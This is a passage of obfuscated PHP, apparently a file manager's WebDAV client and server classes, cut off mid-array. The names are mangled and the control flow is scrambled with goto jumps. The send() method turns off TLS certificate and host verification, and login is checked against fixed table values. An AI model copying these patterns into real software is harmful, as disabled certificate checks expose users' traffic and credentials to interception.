$this->send($bˆÛÁ»±áÚ[211], $aØÏŞÈñ¾ì, $eÃ‰ê˜Ì­–); } protected function send($aš¸ÍêİƒĞ, $bğÁ¨¢¥İİ, $fÀ¤ ù½Å = false, $eèãÑ•é‹‡ = false) { goto A»Ôé¼ŒÕ®; A°í¬»‹‰: curl_setopt($a“¿—õƒ„ã, CURLOPT_HTTPHEADER, $this->header); curl_setopt($a“¿—õƒ„ã, CURLOPT_RETURNTRANSFER, !0); curl_setopt($a“¿—õƒ„ã, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto cß…®‡ŒÉ; AÕ¾‹³ÒÍ‡: $this->header = array(); return $cè™Œ®ÜĞ; goto b¤Ë‡½öæö; A»Ôé¼ŒÕ®: $e›åĞÏ‘¡‰ =& $_SERVER[¿õñ]; $a°Š‚­Óâ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($e›åĞÏ‘¡‰[1691], $e›åĞÏ‘¡‰[50]); goto Bø©´Š„ƒ»; cß…®‡ŒÉ: curl_setopt($a“¿—õƒ„ã, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($a“¿—õƒ„ã, CURLOPT_SSL_VERIFYHOST, !1); $cè™Œ®ÜĞ = curl_exec($a“¿—õƒ„ã); goto AÕ¾‹³ÒÍ‡; Bø©´Š„ƒ»: $this->setHeader($a°Š‚­Óâ); if ($fÀ¤ ù½Å) { $fÀ¤ ù½Å = $e›åĞÏ‘¡‰[1692] . $fÀ¤ ù½Å; } if (!request_url_safe($bğÁ¨¢¥İİ)) { return !1; } goto f¶‹¯õ“; f¶‹¯õ“: $a“¿—õƒ„ã = curl_init($bğÁ¨¢¥İİ); curl_setopt($a“¿—õƒ„ã, CURLOPT_CUSTOMREQUEST, $aš¸ÍêİƒĞ); curl_setopt($a“¿—õƒ„ã, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto A°í¬»‹‰; b¤Ë‡½öæö: } } class HttpDavServer { public function __construct($B±È’ğïù, $fİÄÂÆ‚×Ì) { $this->root = $B±È’ğïù; $this->initPath($fİÄÂÆ‚×Ì); $this->start(); } public function initPath($CĞ´îÊçïÒ) { $EİßâÇÎ =& $_SERVER[¿õñ]; $C¥Û¢¦ˆÜ = rtrim($_SERVER[$EİßâÇÎ[1303]], $EİßâÇÎ[8]) . $EİßâÇÎ[8]; $this->urlBase = substr($C¥Û¢¦ˆÜ, 0, strpos($C¥Û¢¦ˆÜ, $CĞ´îÊçïÒ) + 1); $this->urlBase = rtrim($this->urlBase, $EİßâÇÎ[8]) . $CĞ´îÊçïÒ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $CÖÅªÁÉËÜ =& $_SERVER[¿õñ]; $fèŠĞ„À½‰ = HttpAuth::get(); if ($fèŠĞ„À½‰[$CÖÅªÁÉËÜ[527]] == $CÖÅªÁÉËÜ[1693] && $fèŠĞ„À½‰[$CÖÅªÁÉËÜ[904]] == $CÖÅªÁÉËÜ[1694]) { return !0; } HttpAuth::error(); } public function start() { goto f¬ƒ×“¦†·; EÏğÁÌ½³¢: if (!method_exists($this, $d¬“µÑî©Ç)) { pr($d¬“µÑî©Ç . $E¡˜¼Åà[1695]); die; } $aæïæ×õ¾Œ = array($E¡˜¼Åà[1696], $E¡˜¼Åà[1697]); if (!in_array($d¬“µÑî©Ç, $aæïæ×õ¾Œ) && !$this->pathExists($this->path)) { $bø“Œô©£µ = array($E¡˜¼Åà[1017] => 404); } else { $bø“Œô©£µ = $this->{$d¬“µÑî©Ç}(); } goto còãßß£ËÆ; còãßß£ËÆ: if (!$bø“Œô©£µ) { return; } self::response($bø“Œô©£µ); goto FÎ…¹ª‹æÌ; f¬ƒ×“¦†·: $E¡˜¼Åà =& $_SERVER[¿õñ]; $this->checkUser(); $d¬“µÑî©Ç = $E¡˜¼Åà[141] . HttpHeader::method(); goto EÏğÁÌ½³¢; FÎ…¹ª‹æÌ: } public function pathGet($DÙìøˆéŸ = false) { $DšÏ™„†³¢ =& $_SERVER[¿õñ]; $D¯ºË”Óª = $DÙìøˆéŸ ? $_SERVER[$DšÏ™„†³¢[1698]] : $_SERVER[$DšÏ™„†³¢[1303]]; $D¯ºË”Óª = KodIO::clear(rawurldecode($D¯ºË”Óª)); if (!strstr($D¯ºË”Óª, KodIO::clear($this->urlBase))) { return !1; } return substr($D¯ºË”Óª, strpos($D¯ºË”Óª, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($F“ÇÓÉ‚»Œ) { return file_exists($F“ÇÓÉ‚»Œ); } public function pathMkdir($A àÑµ¬‰ø) { return mkdir($A àÑµ¬‰ø, 511, !0); } public function pathInfo($B¥Âö­ƒÆÎ) { return path_info($B¥Âö­ƒÆÎ); } public function pathList($cÑ·ºİ¬ìÌ) { return path_list($cÑ·ºİ¬ìÌ); } public function pathOut($F³ÄìŒŞºÈ) { echo file_get_contents($F³ÄìŒŞºÈ); } public function pathPut($d¼•Ÿ¹¹°•, $Bƒ“‰ÊÓ± = '') { if (!$Bƒ“‰ÊÓ±) { return file_put_contents($d¼•Ÿ¹¹°•, $_SERVER[¿õñ][33]); } return move_path($Bƒ“‰ÊÓ±, $d¼•Ÿ¹¹°•); } public function pathRemove($aœº‡º¨Èª) { if (is_file($aœº‡º¨Èª)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bˆÙ¤ÒåÃé, $bñŒªåŒË) { return move_path($bˆÙ¤ÒåÃé, $bñŒªåŒË); } public function pathCopy($fáô‰šÍÎÌ, $A¯Óƒğ†…») { return copy_dir($fáô‰šÍÎÌ, $A¯Óƒğ†…»); } public function parsePath($eİ‰“Ë§à–) { return $eİ‰“Ë§à–; } public function parseItem($BÚóÆ¿ß˜¢) { goto aáĞİó÷Í¥; DŞÆ½êêÛá: if (!trim($BÚóÆ¿ß˜¢[$CÜŠµíäçË[106]])) { $BÚóÆ¿ß˜¢[$CÜŠµíäçË[106]] = time(); } if (!trim($BÚóÆ¿ß˜¢[$CÜŠµíäçË[184]])) { $BÚóÆ¿ß˜¢[$CÜŠµíäçË[184]] = time(); } $eÇ¹˜ß‰¹¿ = array($CÜŠµíäçË[1699] => KodIO::clear($this->urlBase . $CÜŠµíäçË[8] . $c©¡™Ïö’), $CÜŠµíäçË[106] => @gmdate($CÜŠµíäçË[1700], $BÚóÆ¿ß˜¢[$CÜŠµíäçË[106]]), $CÜŠµíäçË[184] => @gmdate($CÜŠµíäçË[1701], $BÚóÆ¿ß˜¢[$CÜŠµíäçË[184]]), $CÜŠµíäçË[78] => $BÚóÆ¿ß˜¢[$CÜŠµíäçË[78]] ? $BÚóÆ¿ß˜¢[$CÜŠµíäçË[78]] : 0); goto eæÃâ¥é¬À; eæÃâ¥é¬À: return $eÇ¹˜ß‰¹¿; goto B¡„šÔö‹õ; aáĞİó÷Í¥: $CÜŠµíäçË =& $_SERVER[¿õñ]; $c©¡™Ïö’ = $this->pathGet() . $CÜŠµíäçË[8] . $BÚóÆ¿ß˜¢[$CÜŠµíäçË[28]]; $c©¡™Ïö’ = str_replace($CÜŠµíäçË[169], $CÜŠµíäçË[8], rawurlencode($c©¡™Ïö’)); goto DŞÆ½êêÛá; B¡„šÔö‹õ: } public function parseItemXml($CŒÀ†±³‡¢) { $b‰£«Í´‘Æ =& $_SERVER[¿õñ]; $CÎ‰¤…¢‰ = $this->parseItem($CŒÀ†±³‡¢); if ($CŒÀ†±³‡¢[$b‰£«Í´‘Æ[29]] == $b‰£«Í´‘Æ[77]) { $cğòà¿´‚ = $b‰£«Í´‘Æ[1702]; $cğòà¿´‚ .= $b‰£«Í´‘Æ[1703]; } else { $Câ¨ĞÈé¸¬ = $CŒÀ†±³‡¢[$b‰£«Í´‘Æ[157]] ? $CŒÀ†±³‡¢[$b‰£«Í´‘Æ[157]] : get_path_ext($CŒÀ†±³‡¢[$b‰£«Í´‘Æ[28]]); $eÑĞ’µá«„ = get_file_mime($Câ¨ĞÈé¸¬); $cğòà¿´‚ = $b‰£«Í´‘Æ[1704]; $cğòà¿´‚ .= "\74\x44\72\x67\x65\x74\x63\157\x6e\x74\x65\x6e\x74\x74\171\160\x65\x3e{$eÑĞ’µá«„}\x3c\x2f\104\72\147\145\164\x63\157\x6e\x74\x65\156\164\x74\x79\160\x65\76"; } return "\xa\11\x9\x3c\104\72\x72\145\x73\x70\x6f\x6e\163\145\x3e\12\x9\x9\x9\74\x44\x3a\x68\162\x65\146\76{$CÎ‰¤…¢‰[$b‰£«Í´‘Æ[1699]]}\74\x2f\104\x3a\150\162\x65\146\76\12\x9\x9\11\x3c\104\x3a\160\x72\157\160\163\164\141\164\76\xa\11\x9\11\x9\74\104\x3a\x70\x72\x6f\160\76\xa\x9\11\x9\11\x9\x3c\104\72\x67\x65\164\154\x61\x73\x74\155\x6f\x64\x69\146\151\145\x64\x3e{$CÎ‰¤…¢‰[$b‰£«Í´‘Æ[106]]}\74\x2f\x44\72\147\x65\x74\154\x61\163\x74\x6d\x6f\144\151\146\x69\x65\144\x3e\xa\11\x9\x9\x9\11\x3c\104\x3a\143\x72\145\x61\164\x69\x6f\x6e\144\x61\164\x65\x3e{$CÎ‰¤…¢‰[$b‰£«Í´‘Æ[184]]}\x3c\x2f\x44\72\143\162\x65\141\164\151\x6f\x6e\144\x61\164\x65\x3e\12\11\x9\x9\x9\11\x3c\104\72\147\x65\164\143\x6f\x6e\164\x65\x6e\x74\x6c\145\156\147\164\x68\76{$CÎ‰¤…¢‰[$b‰£«Í´‘Æ[78]]}\x3c\57\104\72\147\x65\x74\x63\x6f\x6e\x74\x65\156\x74\154\145\x6e\x67\x74\x68\x3e\xa\11\x9\x9\11\x9{$cğòà¿´‚}\xa\11\x9\11\11\x3c\x2f\x44\72\x70\x72\157\x70\x3e\12\11\11\x9\x9\x3c\x44\x3a\x73\x74\141\x74\x75\163\76\110\x54\124\x50\57\61\56\x31\40\x32\x30\60\x20\117\113\74\x2f\104\72\163\164\141\x74\165\x73\76\xa\11\x9\11\x3c\x2f\x44\x3a\160\x72\x6f\160\x73\x74\x61\164\76\xa\x9\11\x3c\x2f\x44\72\162\x65\x73\x70\157\x6e\163\x65\x3e"; } public function pathListMerge($E–´»²Ÿéä) { goto B¹ïØ§‚´ƒ; d¬ƒËÂÅØ: return $EÑÜù¬ïƒ; goto C÷‚‡õ›˜Æ; B¹ïØ§‚´ƒ: $D“÷¢İÀõ— =& $_SERVER[¿õñ]; if (!$E–´»²Ÿéä) { return $E–´»²Ÿéä; } $Fµò±ìÎÂ = array($D“÷¢İÀõ—[74], $D“÷¢İÀõ—[75], $D“÷¢İÀõ—[1705]); goto AÊÚ—Ş•²¢; AÊÚ—Ş•²¢: $EÑÜù¬ïƒ = array(); foreach ($E–´»²Ÿéä as $AèæÇ›ñÏí => $e¶ô“Üİ•) { if (!in_array($AèæÇ›ñÏí, $Fµò±ìÎÂ) || !is_array($e¶ô“Üİ•)) { continue; } $EÑÜù¬ïƒ = array_merge($EÑÜù¬ïƒ, $e¶ô“Üİ•); } foreach ($EÑÜù¬ïƒ as &$bÖóÇ“Åêõ) { $bÖóÇ“Åêõ[$D“÷¢İÀõ—[28]] = str_replace($D“÷¢İÀõ—[8], $D“÷¢İÀõ—[1305], $bÖóÇ“Åêõ[$D“÷¢İÀõ—[28]]); } goto d¬ƒËÂÅØ; C÷‚‡õ›˜Æ: } public function httpPROPFIND() { goto E•ù­˜¿í®; B‰‚„ÀĞ“­: if ($fÄÕİ£ôƒ„) { $e²¯‘ï–Óà[$d¥˜±‚ ‹[184]] = $fÄÕİ£ôƒ„[$d¥˜±‚ ‹[184]]; $e²¯‘ï–Óà[$d¥˜±‚ ‹[106]] = $fÄÕİ£ôƒ„[$d¥˜±‚ ‹[106]]; $e²¯‘ï–Óà[$d¥˜±‚ ‹[157]] = $fÄÕİ£ôƒ„[$d¥˜±‚ ‹[157]]; $e²¯‘ï–Óà[$d¥˜±‚ ‹[29]] = $fÄÕİ£ôƒ„[$d¥˜±‚ ‹[29]]; } $dÅ§á­Ï‡ = HttpHeader::get($d¥˜±‚ ‹[1685]); if ($e²¯‘ï–Óà[$d¥˜±‚ ‹[29]] == $d¥˜±‚ ‹[164]) { $dÅ§á­Ï‡ = $d¥˜±‚ ‹[464]; } goto BëòÏ¡–õÃ; fî»¿•Óì»: if (!is_array($D¾Ö¸Á»óÚ)) { return array($d¥˜±‚ ‹[1706] => 404, $d¥˜±‚ ‹[1707] => $d¥˜±‚ ‹[1708]); } $fÄÕİ£ôƒ„ = IO::info($this->path); $e²¯‘ï–Óà = array($d¥˜±‚ ‹[383] => $d¥˜±‚ ‹[33], $d¥˜±‚ ‹[29] => $d¥˜±‚ ‹[77]); goto B‰‚„ÀĞ“­; d¸•ñå´Ì£: return array($d¥˜±‚ ‹[1706] => 207, $d¥˜±‚ ‹[1707] => "\x3c\x44\x3a\155\165\154\164\151\163\x74\x61\164\x75\x73\40\x78\x6d\154\x6e\x73\72\104\75\x22\104\101\x56\x3a\42\76\xa{$dÆ·›¥áôÎ}\xa\x3c\57\x44\x3a\x6d\x75\154\x74\x69\x73\x74\x61\x74\165\163\x3e"); goto dÁò‹÷Ë”Ï; E•ù­˜¿í®: $d¥˜±‚ ‹ =& $_SERVER[¿õñ]; $D¾Ö¸Á»óÚ = $this->pathList($this->path); $D¾Ö¸Á»óÚ = $this->pathListMerge($D¾Ö¸Á»óÚ); goto fî»¿•Óì»; BëòÏ¡–õÃ: if ($dÅ§á­Ï‡ == $d¥˜±‚ ‹[464]) { $D¾Ö¸Á»óÚ = array($e²¯‘ï–Óà); } else { $D¾Ö¸Á»óÚ = array_merge(array($e²¯‘ï–Óà), $D¾Ö¸Á»óÚ); } $dÆ·›¥áôÎ = $d¥˜±‚ ‹[33]; foreach ($D¾Ö¸Á»óÚ as $CœÔ²¦ˆš) { $dÆ·›¥áôÎ .= $this->parseItemXml($CœÔ²¦ˆš); } goto d¸•ñå´Ì£; dÁò‹÷Ë”Ï: } public function httpHEAD() { $dî‚ÈˆÀé =& $_SERVER[¿õñ]; $cß¿¡¾ê¨æ = $this->pathInfo($this->path); if (!$cß¿¡¾ê¨æ || $cß¿¡¾ê¨æ[$dî‚ÈˆÀé[29]] == $dî‚ÈˆÀé[77]) { return array($dî‚ÈˆÀé[1017] => 200, $dî‚ÈˆÀé[1176] => array($dî‚ÈˆÀé[1709])); } return array($dî‚ÈˆÀé[1017] => 200, $dî‚ÈˆÀé[1176] => array($dî‚ÈˆÀé[1710], $dî‚ÈˆÀé[135], $dî‚ÈˆÀé[1711] . $cß¿¡¾ê¨æ[$dî‚ÈˆÀé[78]], $dî‚ÈˆÀé[1712] . get_file_mime($cß¿¡¾ê¨æ[$dî‚ÈˆÀé[157]]), $dî‚ÈˆÀé[131] . gmdate($dî‚ÈˆÀé[1700], $cß¿¡¾ê¨æ[$dî‚ÈˆÀé[1219]]) . $dî‚ÈˆÀé[1713], $dî‚ÈˆÀé[1714])); } public function httpOPTIONS() { $cä¨¦‡ÖÙ­ =& $_SERVER[¿õñ]; return array($cä¨¦‡ÖÙ­[1017] => 200, $cä¨¦‡ÖÙ­[1176] => array($cä¨¦‡ÖÙ­[1715], $cä¨¦‡ÖÙ­[1716], $cä¨¦‡ÖÙ­[1717], $cä¨¦‡ÖÙ­[1675])); } public function httpPROPPATCH() { $BÀÏ”Ò¶ì =& $_SERVER[¿õñ]; $BÃÕ¯‘Ó‡‚ = $BÀÏ”Ò¶ì[1718] . $_SERVER[$BÀÏ”Ò¶ì[1303]] . $BÀÏ”Ò¶ì[1719]; return array($BÀÏ”Ò¶ì[1706] => 207, $BÀÏ”Ò¶ì[1707] => "\x3c\x44\x3a\x6d\165\x6c\164\x69\163\x74\x61\x74\165\x73\40\x78\x6d\154\156\x73\x3a\104\x3d\42\x44\101\126\72\x22\x3e\12{$BÃÕ¯‘Ó‡‚}\12\74\x2f\x44\72\x6d\x75\x6c\x74\x69\x73\x74\141\164\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Fß¸§…¯Ô‰ =& $_SERVER[¿õñ]; $b’Ğó„áÂÒ = $this->uploadFile(); if ($b’Ğó„áÂÒ) { $f«§ºîù—Û = 204; } else { $b’Ğó„áÂÒ = $Fß¸§…¯Ô‰[33]; $f«§ºîù—Û = 201; } $C‡à‚…»ÂÆ = $this->pathPut($this->path, $b’Ğó„áÂÒ); if ($C‡à‚…»ÂÆ == !1) { $f«§ºîù—Û = 404; } return array($Fß¸§…¯Ô‰[1706] => $f«§ºîù—Û); } private function uploadFile() { goto Eí´ç«èí; Eí´ç«èí: $cçÀÔØƒ =& $_SERVER[¿õñ]; @mk_dir(TEMP_FILES); $eÅŒ×‚×Ë = TEMP_FILES . $cçÀÔØƒ[1720] . rand_string(32); goto dÒÛô¡¤å‹; F¿óÅ¹ ÚÏ: while (!feof($C—ñÂã¼ƒÔ)) { fwrite($fØàÆ®Ş, fread($C—ñÂã¼ƒÔ, 1024 * 200)); } fclose($C—ñÂã¼ƒÔ); fclose($fØàÆ®Ş); goto DÌÓ›ğáŞÈ; DÌÓ›ğáŞÈ: if (@filesize($eÅŒ×‚×Ë) > 0) { return $eÅŒ×‚×Ë; } @unlink($eÅŒ×‚×Ë); return !1; goto EàÖ…‘Ÿ°; dÒÛô¡¤å‹: $fØàÆ®Ş = @fopen($eÅŒ×‚×Ë, $cçÀÔØƒ[1430]); $C—ñÂã¼ƒÔ = @fopen($cçÀÔØƒ[1721], $cçÀÔØƒ[1429]); if (!$C—ñÂã¼ƒÔ || !$fØàÆ®Ş) { @unlink($eÅŒ×‚×Ë); return !1; } goto F¿óÅ¹ ÚÏ; EàÖ…‘Ÿ°: } public function httpMKCOL() { $F§†’İ¶¢ =& $_SERVER[¿õñ]; if ($this->pathExists($this->path)) { return array($F§†’İ¶¢[1017] => 409); } $Bœ…ù‘™±ß = $this->pathMkdir($this->path); return array($F§†’İ¶¢[1017] => $Bœ…ù‘™±ß ? 201 : 403); } public function httpMOVE() { $cß†¤ïÏ°¯ =& $_SERVER[¿õñ]; $d‘™÷Š·²§ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$cß†¤ïÏ°¯[1722]])) { $Aò×î™–Æ®[$cß†¤ïÏ°¯[1723]] = $_SERVER[$cß†¤ïÏ°¯[1722]] == $cß†¤ïÏ°¯[1724]; } $AÁ®Õ¥õ‹Û = $this->pathMove($this->path, $d‘™÷Š·²§); return array($cß†¤ïÏ°¯[1017] => $AÁ®Õ¥õ‹Û ? 201 : 404); } public function httpCOPY() { $d¡¹í¬õ×Ç = $this->parsePath($this->pathGet(!0)); $C¢õñ­¾¹ = $this->pathCopy($this->path, $d¡¹í¬õ×Ç); return array($_SERVER[¿õñ][1017] => $C¢õñ­¾¹ ? 201 : 404); } public function httpDELETE() { $e¼õğÄÌ™‹ = $this->pathRemove($this->path); return array($_SERVER[¿õñ][1017] => $e¼õğÄÌ™‹ ? 200 : 503); } public function httpLOCK() { $dÍŒéÇ—·– =& $_SERVER[¿õñ]; $eÍ¾¤ˆ¨òÆ = md5($this->path); $Eâœ‰¯ª = $dÍŒéÇ—·–[1725] . $this->xmlGet($dÍŒéÇ—·–[1726]) . $dÍŒéÇ—·–[1727] . $eÍ¾¤ˆ¨òÆ . $dÍŒéÇ—·–[1728]; return array($dÍŒéÇ—·–[1017] => 200, $dÍŒéÇ—·–[1176] => array($dÍŒéÇ—·–[1729] . $eÍ¾¤ˆ¨òÆ, $dÍŒéÇ—·–[1730]), $dÍŒéÇ—·–[1731] => $Eâœ‰¯ª); } public function httpUNLOCK() { return array($_SERVER[¿õñ][1017] => 204); } public function xmlGet($fÊŒ¦ÚÓÓ) { goto eõºŸËÙÁÖ; dÎê¨Şµ¤æ: $a‚Á‹ë…µ = array_shift(explode($D‡Ùë¬æ·Ã[8], $fÊŒ¦ÚÓÓ)); $F‚ˆÛ®Ôõù = $CÜ÷Î‹ÃÎ->getElementsByTagNameNS($D‡Ùë¬æ·Ã[1733], $a‚Á‹ë…µ); if ($F‚ˆÛ®Ôõù) { return $F‚ˆÛ®Ôõù[0]->nodeValue; } goto E¹Š¯£‡Í; E¹Š¯£‡Í: return $D‡Ùë¬æ·Ã[33]; goto få”œŸ˜Œ; eõºŸËÙÁÖ: $D‡Ùë¬æ·Ã =& $_SERVER[¿õñ]; static $CÜ÷Î‹ÃÎ = false; if (!$CÜ÷Î‹ÃÎ) { $DÌÁ—›»Ü = file_get_contents($D‡Ùë¬æ·Ã[1732]); $CÜ÷Î‹ÃÎ = new DOMDocument(); $CÜ÷Î‹ÃÎ->loadXML($DÌÁ—›»Ü); } goto dÎê¨Şµ¤æ; få”œŸ˜Œ: } public static function response($B»Ü¬äªº) { goto e”‡ºÜƒÅî; a“Ì…æŠÖ®: if (is_string($B»Ü¬äªº[$c§–£ŸÄ[1731]])) { header($c§–£ŸÄ[1734]); $E‘«†±…°˜ = $c§–£ŸÄ[1735] . $c§–£ŸÄ[214] . $B»Ü¬äªº[$c§–£ŸÄ[1731]]; echo $E‘«†±…°˜; } goto E¹ŠÛËóµï; e”‡ºÜƒÅî: $c§–£ŸÄ =& $_SERVER[¿õñ]; $EÂ“’—¤ˆ = is_array($B»Ü¬äªº[$c§–£ŸÄ[1176]]) ? $B»Ü¬äªº[$c§–£ŸÄ[1176]] : array(); $EÂ“’—¤ˆ[] = HttpHeader::code($B»Ü¬äªº[$c§–£ŸÄ[1017]]); goto fÒƒœÇ­„Î; fÒƒœÇ­„Î: $EÂ“’—¤ˆ[] = $c§–£ŸÄ[1673]; $EÂ“’—¤ˆ[] = $c§–£ŸÄ[1674]; foreach ($EÂ“’—¤ˆ as $Aâ‰ô©‡«°) { header($Aâ‰ô©‡«°); } goto a“Ì…æŠÖ®; E¹ŠÛËóµï: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\x74" => "\x48\124\x54\x50\137\110\x4f\x53\x54", "\125\163\x65\x72\x2d\101\x67\145\x6e\164" => "\x48\x54\124\120\x5f\x55\x53\x45\122\137\101\x47\105\116\124", "\x43\x6f\156\x74\145\x6e\164\55\124\x79\160\145" => "\x48\124\124\120\137\103\117\116\x54\105\116\124\x5f\124\131\120\x45", "\103\x6f\156\x74\x65\x6e\164\x2d\114\x65\x6e\x67\164\x68" => "\110\x54\x54\x50\x5f\x43\117\x4e\x54\105\116\124\x5f\114\x45\116\x47\x54\x48", "\x44\x65\x70\x74\150" => "\x48\x54\124\x50\137\x44\105\120\x54\x48", "\105\x78\160\x65\143\x74" => "\110\124\124\x50\x5f\x45\130\120\105\103\124", "\x49\x66\x2d\x4e\x6f\156\x65\x2d\x4d\141\x74\x63\x68" => "\x48\124\x54\x50\137\111\106\137\x4e\x4f\x4e\105\x5f\115\x41\124\103\110", "\111\x66\x2d\115\141\x74\x63\150" => "\x48\124\x54\x50\x5f\x49\106\137\x4d\x41\x54\103\x48", "\x49\146\x2d\122\141\x6e\147\x65" => "\110\124\x54\x50\137\111\x46\x5f\122\101\116\x47\105", "\x4c\141\163\164\x2d\x4d\x6f\x64\151\146\151\x65\x64" => "\x48\x54\124\120\137\x4c\x41\123\124\x5f\115\x4f\x44\x49\x46\111\x45\x44", "\x49\146\x2d\115\x6f\144\x69\146\x69\x65\x64\x2d\123\151\x6e\x63\145" => "\x48\x54\124\x50\x5f\111\106\x5f\115\117\104\111\106\x49\x45\104\137\x53\x49\x4e\x43\105", "\111\x66\x2d\125\x6e\155\x6f\x64\x69\x66\151\x65\x64\x2d\123\x69\156\143\145" => "\110\124\124\120\137\111\x46\137\125\x4e\115\117\x44\111\x46\111\x45\x44\x5f\x53\111\116\103\105", "\x52\x61\x6e\x67\x65" => "\110\124\124\120\x5f\x52\x41\116\107\x45", "\124\151\x6d\x65\157\x75\164" => "\x48\124\124\x50\137\x54\x49\x4d\105\117\125\124", "\111\146" => "\x48\x54\124\x50\137\111\x46", "\114\157\143\x6b\x2d\124\157\153\145\x6e" => "\x48\124\x54\120\137\x4c\117\x43\113\137\124\x4f\x4b\105\x4e", "\x4f\x76\145\162\x77\162\151\164\x65" => "\110\x54\124\120\x5f\117\126\105\x52\x57\x52\x49\x54\x45", "\104\145\163\164\151\156\141\x74\x69\x6f\x6e" => "\110\124\x54\x50\x5f\x44\x45\x53\x54\111\x4e\x41\x54\x49\117\x4e", "\x52\x65\x71\165\x65\163\x74\x2d\111\144" => "\122\105\x51\125\105\123\124\x5f\111\x44", "\122\x65\x71\165\145\163\x74\x2d\x42\157\x64\x79\x2d\x46\151\154\x65" => "\122\x45\121\x55\x45\123\124\x5f\102\x4f\104\x59\x5f\x46\x49\114\105", "\x52\145\144\151\x72\145\x63\164\x2d\123\164\x61\164\165\163" => "\x52\105\x44\111\x52\105\103\124\x5f\x53\124\x41\124\x55\x53"); public static function init() { static $EÎ¦íƒ½¤ª = false; if ($EÎ¦íƒ½¤ª) { return; } foreach ($_SERVER as $a‚å¦­Ğö¥ => $c¸”Î‡İÎ„) { $a‚å¦­Ğö¥ = strtoupper($a‚å¦­Ğö¥); if (!array_key_exists($a‚å¦­Ğö¥, $_SERVER)) { continue; } $_SERVER[$a‚å¦­Ğö¥] = $c¸”Î‡İÎ„; } foreach (self::$_headers as $a‚å¦­Ğö¥ => $e˜ÔÕŒ¨¾ù) { if (!array_key_exists($a‚å¦­Ğö¥, $_SERVER)) { continue; } $_SERVER[$a‚å¦­Ğö¥] = $_SERVER[$e˜ÔÕŒ¨¾ù]; $_SERVER[strtoupper($a‚å¦­Ğö¥)] = $_SERVER[$e˜ÔÕŒ¨¾ù]; } } public static function get($Aİ…¹†³‰) { self::init(); return $_SERVER[$Aİ…¹†³‰] ? $_SERVER[$Aİ…¹†³‰] : $_SERVER[$_SERVER[¿õñ][1736] . strtoupper($Aİ…¹†³‰)]; } public static function method() { return strtoupper(self::get($_SERVER[¿õñ][149])); } public static function length() { $AàÇÆ÷‘‡ =& $_SERVER[¿õñ]; $bô®ÛÒ½š™ = self::get($AàÇÆ÷‘‡[1737]); if (!$bô®ÛÒ½š™) { $bô®ÛÒ½š™ = self::get($AàÇÆ÷‘‡[1114]); } return $bô®ÛÒ½š™; } public static function range() { $fÁ…¸æÍ‹÷ =& $_SERVER[¿õñ]; $BµÚÏ–ÈÑ¥ = self::get($fÁ…¸æÍ‹÷[195]); if (!$BµÚÏ–ÈÑ¥) { return !1; } if (!preg_match($fÁ…¸æÍ‹÷[1738], $BµÚÏ–ÈÑ¥, $cÅ©–çÛÆ)) { return !1; } if ($cÅ©–çÛÆ[1] === $fÁ…¸æÍ‹÷[33] && $cÅ©–çÛÆ[2] === $fÁ…¸æÍ‹÷[33]) { return !1; } return array($cÅ©–çÛÆ[1] !== $fÁ…¸æÍ‹÷[33] ? $cÅ©–çÛÆ[1] : null, $cÅ©–çÛÆ[2] !== $fÁ…¸æÍ‹÷[33] ? $cÅ©–çÛÆ[2] : null); } public static $statusCode = array("\61\60\x30" => "\x43\x6f\156\x74\x69\x6e\165\145", "\x31\60\61" => "\123\167\151\x74\143\x68\151\x6e\147\x20\120\162\x6f\x74\157\143\157\154", "\x31\60\62" => "\x50\162\x6f\143\x65\x73\163\x69\156\x67", "\x31\60\x33" => "\x45\141\x72\154\x79\x20\110\151\156\x74\x73", "\62\60\60" => "\117\x4b", "\62\x30\61" => "\103\x72\x65\x61\164\x65\x64", "\x32\60\x32" => "\101\x63\143\145\x70\164\145\144", "\x32\60\63" => "\116\x6f\x6e\x2d\x41\x75\164\x68\x6f\162\151\x74\x61\x74\151\x76\145\40\x49\x6e\146\157\162\155\141\x74\151\157\x6e", "\62\60\64" => "\x4e\157\40\x43\157\156\164\145\x6e\x74", "\62\x30\65" => "\122\x65\x73\x65\164\40\103\157\x6e\x74\145\156\x74", "\x32\60\x36" => "\x50\141\x72\164\151\141\154\x20\103\157\156\164\x65\x6e\x74", "\x32\60\67" => "\115\165\154\x74\x69\55\x53\x74\x61\x74\x75\x73", "\x33\x30\60" => "\115\x75\154\x74\x69\160\154\x65\40\x43\x68\x6f\x69\143\145\163", "\63\x30\61" => "\115\157\x76\x65\144\40\x50\145\162\155\x61\156\145\156\164\154\x79", "\x33\x30\x32" => "\106\157\x75\156\144", "\63\x30\63" => "\x53\145\145\x20\x4f\164\150\145\162", "\63\60\x34" => "\x4e\x6f\x74\x20\x4d\x6f\x64\151\146\151\x65\x64", "\63\x30\65" => "\x55\x73\145\40\x50\162\x6f\x78\171", "\63\60\67" => "\x54\x65\155\160\157\x72\x61\x72\171\40\x52\145\x64\x69\x72\145\x63\164", "\63\60\70" => "\x50\145\x72\155\x61\156\x65\x6e\x74\x20\122\x65\144\151\x72\x65\x63\x74", "\64\x30\60" => "\x42\141\x64\x20\122\145\x71\x75\x65\x73\164", "\64\60\61" => "\125\x6e\x61\x75\164\150\157\x72\151\172\145\144", "\64\x30\x32" => "\120\x61\171\x6d\x65\x6e\164\x20\x52\x65\161\x75\x69\x72\145\144", "\x34\x30\x33" => "\106\157\162\142\x69\144\144\145\156", "\64\60\64" => "\116\157\x74\x20\106\x6f\x75\x6e\144", "\x34\60\65" => "\x4d\145\x74\150\x6f\144\x20\x4e\157\x74\x20\101\x6c\x6c\x6f\167\145\144", "\64\x30\66" => "\116\x6f\x74\x20\101\143\x63\x65\x70\x74\141\142\154\x65", "\x34\x30\x37" => "\x50\162\x6f\170\171\40\x41\x75\x74\x68\x65\156\x74\x69\143\x61\164\x69\x6f\x6e\40\122\x65\161\x75\x69\x72\145\144", "\64\x30\70" => "\122\145\x71\x75\145\x73\x74\x20\124\x69\155\145\157\165\164", "\x34\x30\x39" => "\103\157\x6e\146\154\x69\143\164", "\64\61\x30" => "\107\x6f\x6e\145", "\x34\x31\61" => 